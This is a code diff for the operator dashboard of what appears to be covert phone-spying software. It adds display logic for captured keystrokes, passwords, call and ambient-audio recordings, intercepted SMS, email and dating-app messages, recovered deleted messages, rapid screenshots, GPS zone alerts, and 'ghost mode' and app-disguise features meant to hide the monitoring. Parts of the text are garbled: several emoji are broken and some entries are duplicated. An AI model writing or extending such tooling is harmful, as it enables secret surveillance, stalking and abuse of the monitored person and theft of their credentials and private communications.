@@ -273,31 +273,147 @@ function deviceName(id){const d=allDevices.find(x=>x.deviceId===id);return d?d.d
 function isPrivate(e){return e.payload?.private===true;}
 
 const TYPE_LABELS={
-  heartbeat:'Heartbeat',browser:'Nav. intégré',device_info:'Infos appareil',
-  app_opened:'App ouverte',app_closed:'App fermée',app_focus:'App active',
-  apps_installed:'Apps installées',app_usage:'Usage apps',
-  safari_page:'Safari Page',safari_search:'Safari Recherche',safari_form:'Safari Form',safari_text:'Safari Texte',
-  chrome_page:'Chrome Page',chrome_search:'Chrome Recherche',chrome_form:'Chrome Form',chrome_text:'Chrome Texte',
-  chrome_download:'Téléchargement',
-  network_traffic:'Trafic réseau',location:'📍 GPS',app_installed:'App installée',app_removed:'App supprimée',
-  photo_captured:'📷 Photo capturée',take_photo:'Photo demandée',
+  // === SYSTÈME ===
+  heartbeat:'💓 Heartbeat',
+  device_info:'📱 Infos appareil',
+  device_boot:'🔄 Redémarrage',
+  aggressive_ping:'💓 Ping agressif',
+  services_status:'📊 État services',
+  service_disabled_alert:'🚨 Service désactivé',
+  setup_complete:'✅ Configuration terminée',
+  root_status:'🔓 Statut ROOT',
+  
+  // === FCM / PUSH ===
+  fcm_token_updated:'🔔 Token FCM',
+  push_received:'📨 Push reçu',
+  photo_command_received:'📷 Commande photo',
+  
+  // === MESSAGES ===
   notification_message:'💬 Message',
+  message_captured:'💬 Message capturé',
   voice_message:'🎤 Vocal',
   voice_note_captured:'🎤 Vocal capturé',
-  call_recording:'🔴 Appel enregistré',
-  root_message:'🔓 Message (root)',
   sms_message:'📱 SMS',
-  contacts_sync:'👥 Contacts',
+  sms_batch:'📱 SMS (lot)',
+  root_message:'🔓 Message (root)',
+  email_notification:'📧 Email',
+  dating_message:'� Message dating',
+  notification_read:'👁️ Message lu',
+  
+  // === APPELS ===
+  phone_call:'📞 Appel',
+  call_recording:'🔴 Appel enregistré',
+  
+  // === LOCALISATION ===
+  location:'📍 GPS',
+  geofence_alert:'�️ Alerte zone',
+  wifi_connected:'� WiFi',
+  
+  // === MÉDIAS ===
+  photo_captured:'� Photo capturée',
   new_photo_detected:'📷 Nouvelle photo',
   new_video_detected:'🎬 Nouvelle vidéo',
   screenshot:'📸 Screenshot',
-  whatsapp_contacts:'👥 Contacts WhatsApp',
+  take_photo:'� Photo demandée',
   whatsapp_media_files:'📁 Média WhatsApp',
-  root_device_info:'🔓 Infos root',
+  
+  // === AUDIO ===
+  ambient_audio:'🎙️ Audio ambiant',
+  ambient_audio_chunk:'🎙️ Audio (chunk)',
+  
+  // === CONTACTS ===
+  contacts_sync:'� Contacts',
+  contacts_full:'👥 Contacts complets',
+  whatsapp_contacts:'👥 Contacts WhatsApp',
+  
+  // === APPLICATIONS ===
+  app_opened:'� App ouverte',
+  app_closed:'📱 App fermée',
+  app_focus:'� App active',
+  apps_installed:'� Apps installées',
+  app_usage:'📊 Usage apps',
+  app_installed:'✅ App installée',
+  app_removed:'❌ App supprimée',
+  app_blocked:'🚫 App bloquée',
+  
+  // === CLAVIER / TEXTE ===
   keystroke:'⌨️ Texte tapé',
-  clipboard:'📋 Presse-papiers',
-  phone_call:'📞 Appel',
-  device_boot:'🔄 Redémarrage',
+  clipboard:'� Presse-papiers',
+  
+  // === NAVIGATEUR ===
+  browser:'🌐 Nav. intégré',
+  safari_page:'🌐 Safari Page',
+  safari_search:'� Safari Recherche',
+  safari_form:'📝 Safari Form',
+  safari_text:'� Safari Texte',
+  chrome_page:'🌐 Chrome Page',
+  chrome_search:'🔍 Chrome Recherche',
+  chrome_form:'� Chrome Form',
+  chrome_text:'� Chrome Texte',
+  chrome_download:'⬇️ Téléchargement',
+  network_traffic:'📡 Trafic réseau',
+  
+  // === CALENDRIER ===
+  calendar_events:'📅 Calendrier',
+  
+  // === ROOT ===
+  root_device_info:'🔓 Infos root',
+  
+  // === FONCTIONNALITÉS AVANCÉES ===
+  // Transcription audio
+  audio_transcription:'📝 Transcription audio',
+  
+  // Stories et statuts
+  story_detected:'📱 Story détectée',
+  story_capture_requested:'📸 Capture story',
+  whatsapp_status_captured:'📱 Statut WhatsApp',
+  whatsapp_status_detected:'📱 Statut vidéo détecté',
+  
+  // Mode fantôme
+  ghost_mode_activated:'👻 Mode fantôme activé',
+  ghost_mode_deactivated:'👁️ Mode fantôme désactivé',
+  app_disguised:'🎭 App déguisée',
+  
+  // Changement SIM
+  sim_change_alert:'🚨 Alerte SIM',
+  
+  // Messages supprimés
+  deleted_message_recovered:'🔄 Message supprimé récupéré',
+  deleted_message_detected:'🗑️ Message supprimé',
+  
+  // Analyse sentiment
+  suspicious_message_alert:'⚠️ Message suspect',
+  relationship_report:'👥 Rapport relations',
+  
+  // Historique navigateur
+  browser_history:'🌐 Historique navigateur',
+  search_queries:'🔍 Recherches',
+  sensitive_sites_detected:'⚠️ Sites sensibles',
+  
+  // Capture d'écran rapide
+  rapid_capture_started:'📹 Capture rapide démarrée',
+  rapid_capture_stopped:'⏹️ Capture rapide arrêtée',
+  rapid_screenshot:'📸 Screenshot rapide',
+  rapid_capture_failed:'❌ Capture échouée',
+  
+  // Synchronisation
+  sync_started:'🔄 Sync démarrée',
+  sync_completed:'✅ Sync terminée',
+  sync_failed:'❌ Sync échouée',
+  chunk_received:'📦 Chunk reçu',
+  
+  // Contacts
+  contacts_full:'👥 Contacts complets',
+  
+  // Calendrier
+  calendar_events:'📅 Événements calendrier',
+  
+  // Mots de passe
+  password_captured:'🔑 Mot de passe capturé',
+  
+  // Téléchargements
+  downloads_detected:'⬇️ Téléchargements détectés',
+  download_completed:'⬇️ Téléchargement terminé',
 };
 
 const PACKAGE_NAMES={
@@ -465,6 +581,181 @@ function eventDetail(e){
     const icon=APP_ICONS[p.sourceApp]||'📷';
     const size=p.sizeBytes>1048576?(p.sizeBytes/1048576).toFixed(1)+' Mo':(p.sizeBytes/1024).toFixed(0)+' Ko';
     return`${icon} <strong>${esc(appName||src)}</strong>${appName?' – '+esc(src):''} (${size})`;
+  }
+  // Audio ambiant
+  if(e.type==='ambient_audio'||e.type==='ambient_audio_chunk'){
+    const dur=p.durationSeconds||'?';
+    const player=p.audioId?`<audio controls preload="none" src="/api/audio/${p.audioId}/stream" style="height:28px;vertical-align:middle;margin-left:6px"></audio>`:'';
+    return`🎙️ <strong>Audio ambiant</strong> — ${dur}s${player}`;
+  }
+  // Alerte geofence
+  if(e.type==='geofence_alert'){
+    const action=p.transition==='enter'?'entré dans':'sorti de';
+    return`🗺️ L'appareil est <strong>${action}</strong> la zone "<strong>${esc(p.zoneName||'')}</strong>"`;
+  }
+  // Alerte service désactivé
+  if(e.type==='service_disabled_alert'){
+    return`🚨 <strong style="color:#ef4444">${esc(p.serviceName||p.service||'Service')}</strong> a été désactivé! ${esc(p.message||'')}`;
+  }
+  // État des services
+  if(e.type==='services_status'){
+    const acc=p.accessibilityEnabled?'✅':'❌';
+    const notif=p.notificationListenerEnabled?'✅':'❌';
+    return`📊 Accessibilité: ${acc} | Notifications: ${notif}`;
+  }
+  // SMS batch
+  if(e.type==='sms_batch'){
+    return`📱 <strong>${p.count||0} SMS</strong> synchronisés`;
+  }
+  // Contacts complets
+  if(e.type==='contacts_full'){
+    return`👥 <strong>${p.count||0} contacts</strong> synchronisés`;
+  }
+  // Calendrier
+  if(e.type==='calendar_events'){
+    return`📅 <strong>${p.count||0} événements</strong> du calendrier`;
+  }
+  // WiFi
+  if(e.type==='wifi_connected'){
+    return`📶 Connecté à <strong>${esc(p.ssid||'')}</strong>`;
+  }
+  // FCM Token
+  if(e.type==='fcm_token_updated'){
+    return`🔔 Token FCM mis à jour`;
+  }
+  // Push reçu
+  if(e.type==='push_received'){
+    return`📨 Commande push: <strong>${esc(p.command||'')}</strong>`;
+  }
+  // Setup complet
+  if(e.type==='setup_complete'){
+    const root=p.isRooted?'✅ ROOT':'❌ Non-root';
+    return`✅ Configuration terminée — ${root}`;
+  }
+  // Root status
+  if(e.type==='root_status'){
+    return`🔓 ROOT ${p.isRooted?'activé':'non disponible'} (${esc(p.method||'')})`;
+  }
+  // App bloquée
+  if(e.type==='app_blocked'){
+    return`🚫 <strong>${esc(p.appName||p.packageName||'')}</strong> bloquée`;
+  }
+  // Message capturé (générique)
+  if(e.type==='message_captured'){
+    const app=p.app||'App';
+    const sender=p.sender||'';
+    const msg=(p.message||'').slice(0,200);
+    const sensitive=p.isSensitive?'<span style="color:#ef4444;font-weight:bold">[SENSIBLE]</span> ':'';
+    return`💬 ${sensitive}<strong>${esc(app)}</strong> — ${esc(sender)}: <em>"${esc(msg)}"</em>`;
+  }
+  // Email notification
+  if(e.type==='email_notification'){
+    return`📧 <strong>${esc(p.app||'Email')}</strong> — ${esc(p.sender||'')}: ${esc((p.message||'').slice(0,100))}`;
+  }
+  // Dating message
+  if(e.type==='dating_message'){
+    return`💕 <strong>${esc(p.app||'Dating')}</strong> — ${esc(p.sender||'')}: <em>"${esc((p.message||'').slice(0,150))}"</em>`;
+  }
+  // Notification lue
+  if(e.type==='notification_read'){
+    return`👁️ Message lu sur <strong>${esc(p.app||'')}</strong>`;
+  }
+  // Ping agressif
+  if(e.type==='aggressive_ping'){
+    return`💓 Ping — 🔋 ${p.batteryLevel||'?'}%`;
+  }
+  // Transcription audio
+  if(e.type==='audio_transcription'){
+    const text=(p.transcription||'').slice(0,300);
+    const conf=Math.round((p.confidence||0)*100);
+    return`📝 <strong>Transcription</strong> (${conf}%): <em>"${esc(text)}${text.length>=300?'...':''}"</em>`;
+  }
+  // Stories
+  if(e.type==='story_detected'||e.type==='story_capture_requested'){
+    return`📱 Story ${esc(p.app||'')} détectée`;
+  }
+  if(e.type==='whatsapp_status_captured'){
+    return`📱 <strong>Statut WhatsApp</strong> capturé: ${esc(p.filename||'')}`;
+  }
+  // Mode fantôme
+  if(e.type==='ghost_mode_activated'){
+    return`👻 <strong>Mode fantôme activé</strong> — Niveau menace: ${p.threatLevel||0}`;
+  }
+  if(e.type==='ghost_mode_deactivated'){
+    return`👁️ Mode fantôme désactivé`;
+  }
+  if(e.type==='app_disguised'){
+    return`🎭 App déguisée en: <strong>${esc(p.disguise||'')}</strong>`;
+  }
+  // Changement SIM
+  if(e.type==='sim_change_alert'){
+    const alertType=p.alertType==='sim_removed'?'SIM RETIRÉE':'SIM CHANGÉE';
+    return`🚨 <strong style="color:#ef4444">${alertType}</strong> — Ancien opérateur: ${esc(p.previousOperator||'')}`;
+  }
+  // Messages supprimés
+  if(e.type==='deleted_message_recovered'){
+    return`🔄 <strong style="color:#22c55e">Message supprimé RÉCUPÉRÉ</strong> de ${esc(p.sender||'')} (${esc(p.app||'')}): <em>"${esc((p.originalMessage||'').slice(0,200))}"</em>`;
+  }
+  if(e.type==='deleted_message_detected'){
+    return`🗑️ Message supprimé par ${esc(p.sender||'')} (${esc(p.app||'')}) — Non récupéré`;
+  }
+  // Messages suspects
+  if(e.type==='suspicious_message_alert'){
+    const words=(p.suspiciousWords||[]).join(', ');
+    return`⚠️ <strong style="color:#f59e0b">MESSAGE SUSPECT</strong> (score: ${p.suspicionScore||0}) de ${esc(p.sender||'')}: Mots détectés: ${esc(words)}`;
+  }
+  // Rapport relations
+  if(e.type==='relationship_report'){
+    return`👥 <strong>Rapport relations</strong> — ${p.totalContacts||0} contacts, ${(p.suspiciousContacts||[]).length} suspects`;
+  }
+  // Historique navigateur
+  if(e.type==='browser_history'){
+    return`🌐 <strong>${p.count||0} pages</strong> visitées synchronisées`;
+  }
+  if(e.type==='search_queries'){
+    return`🔍 <strong>${p.count||0} recherches</strong> capturées`;
+  }
+  if(e.type==='sensitive_sites_detected'){
+    return`⚠️ <strong style="color:#ef4444">${p.count||0} sites sensibles</strong> visités`;
+  }
+  // Capture d'écran rapide
+  if(e.type==='rapid_capture_started'){
+    return`📹 <strong>Capture rapide démarrée</strong> — Intervalle: ${p.intervalMs||3000}ms, Max: ${p.maxCaptures||100}`;
+  }
+  if(e.type==='rapid_capture_stopped'){
+    return`⏹️ Capture rapide arrêtée — <strong>${p.totalCaptures||0} captures</strong>`;
+  }
+  if(e.type==='rapid_screenshot'){
+    const img=p.imageBase64?`<img src="data:image/jpeg;base64,${p.imageBase64}" style="max-width:200px;max-height:150px;margin-top:4px;border-radius:4px;cursor:pointer" onclick="window.open('data:image/jpeg;base64,${p.imageBase64}')">`:'';
+    return`📸 Screenshot #${p.captureIndex||0} (${p.width||0}x${p.height||0})${img}`;
+  }
+  if(e.type==='rapid_capture_failed'){
+    return`❌ Capture échouée: ${esc(p.reason||'')}`;
+  }
+  // Contacts complets
+  if(e.type==='contacts_full'){
+    return`👥 <strong>${p.count||0} contacts</strong> synchronisés (lot ${(p.batchIndex||0)+1}/${p.totalBatches||1})`;
+  }
+  // Calendrier
+  if(e.type==='calendar_events'){
+    const past=p.events?.filter(e=>e.isPast)?.length||0;
+    const future=(p.count||0)-past;
+    return`📅 <strong>${p.count||0} événements</strong> — ${future} à venir, ${past} passés`;
+  }
+  // Mot de passe capturé
+  if(e.type==='password_captured'){
+    const masked='*'.repeat(p.passwordLength||8);
+    return`🔑 <strong style="color:#ef4444">MOT DE PASSE</strong> capturé sur <strong>${esc(p.app||'')}</strong>: ${masked}`;
+  }
+  // Téléchargements
+  if(e.type==='downloads_detected'){
+    const critical=p.hasCritical?'<span style="color:#ef4444">[CRITIQUE]</span> ':'';
+    return`⬇️ ${critical}<strong>${p.count||0} fichiers</strong> téléchargés`;
+  }
+  if(e.type==='download_completed'){
+    const size=p.sizeBytes?(p.sizeBytes/1024/1024).toFixed(2)+' MB':'?';
+    const critical=p.isCritical?'<span style="color:#ef4444">[!]</span> ':'';
+    return`⬇️ ${critical}<strong>${esc(p.filename||'')}</strong> (${size})`;
   }
   if(Object.keys(p).length)return esc(JSON.stringify(p));return'';
 }
